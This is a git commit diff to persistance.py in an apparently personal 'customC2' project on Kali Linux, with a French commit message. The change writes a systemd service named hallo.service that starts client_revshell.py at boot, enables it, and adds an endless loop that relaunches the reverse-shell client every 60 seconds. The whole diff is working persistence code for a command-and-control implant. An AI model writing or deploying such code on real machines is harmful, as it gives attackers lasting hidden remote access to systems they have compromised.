53acbcc5f54d0bfe535cb35491896c801ca75b80
Raphaël LIYANAGE <raphael.kliyanage@gmail.com>
2023-06-18 19:49:19 +0200

    persistance ok sur kali

--- persistance.py
+++ persistance.py
@@ -4,13 +4,14 @@
 
 import time
 import os
+import subprocess
 
 # Cross-plateforme : vérification de l'OS client
 if os.name == 'nt':
     # persistance windows nt
     print(8+1)
 else:
-    service_path = "/etc/sysmted/system/hallo.service"
+    service_path = "/etc/systemd/system/hallo.service"
 
     if not os.path.exists(service_path):
         open(service_path,"w").writelines('''
@@ -18,11 +19,15 @@ else:
         Description=Lancement au démarrage
 
         [Service]
-        ExecStart=/usr/bin/python3 /home/kali/python/customC2/persistance.py
+        ExecStart=/usr/bin/python3 /home/kali/Documents/python/projet_python/customC2/client_revshell.py
 
         [Install]
         WantedBy=multi-user.target''')
         os.system("systemctl enable --now hallo.service")
+    
+while True:
+    subprocess.call("python3 client_revshell.py", shell=True)
+    time.sleep(60)
 
 # ajouter un copier/coller du fichier
 # ajouter support windows
